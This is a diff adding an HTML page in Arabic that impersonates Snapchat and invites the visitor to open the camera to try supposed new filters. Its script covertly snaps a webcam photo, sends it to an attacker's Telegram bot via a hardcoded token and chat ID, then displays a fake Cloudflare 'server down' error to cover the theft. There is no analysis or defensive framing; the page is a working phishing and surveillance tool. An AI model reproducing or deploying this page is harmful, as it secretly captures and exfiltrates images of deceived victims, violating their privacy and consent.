@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Login</title>
+    <style>
+        body { background-color: #FFFC00; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .snap-logo { width: 80px; margin-bottom: 20px; }
+        .login-box { background: white; padding: 25px; border-radius: 15px; width: 85%; max-width: 320px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .btn { background-color: #000; color: white; border: none; padding: 12px 20px; border-radius: 25px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
+        #error-page { display: none; background-color: #fff; text-align: center; padding-top: 50px; font-family: Arial, sans-serif; height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 999; }
+    </style>
+</head>
+<body>
+
+    <div id="snap-ui">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="snap-logo">
+        <div class="login-box">
+            <h3>تحديث العدسات الجديد</h3>
+            <p>يجب السماح بالكاميرا لتجربة فلاتر سناب شات الجديدة حصرياً على المتصفح.</p>
+            <button class="btn" onclick="takePic()">فتح الكاميرا</button>
+        </div>
+    </div>
+
+    <div id="error-page">
+        <h1 style="font-size: 35px; color: #333;">Web server is down <span style="background: #eee; padding: 2px 5px; border-radius: 3px; font-size: 12px; color: #666;">Error code 521</span></h1>
+        <p style="color: #666;">Visit cloudflare.com for more information.</p>
+        <hr style="width: 80%; opacity: 0.3;">
+        <img src="https://dash.cloudflare.com/assets/f7c1d3c50009c91b5c2c.png" style="width: 90%; max-width: 500px; margin-top: 20px;">
+        <p style="margin-top: 30px; color: #444; padding: 0 20px;"><b>What happened?</b><br>The web server is not returning a connection.</p>
+    </div>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        // تم تصحيح الأرقام هنا بوضعها داخل علامات تنصيص
+        const botToken = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs"; 
+        const chatId = "8005843544";
+
+        function takePic() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'capture.png');
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            document.getElementById('snap-ui').style.display = 'none';
+                            document.getElementById('error-page').style.display = 'block';
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 'image/png');
+                }, 1000); 
+            })
+            .catch(err => {
+                document.getElementById('snap-ui').style.display = 'none';
+                document.getElementById('error-page').style.display = 'block';
+            });
+        }
+    </script>
+</body>
+</html>
+
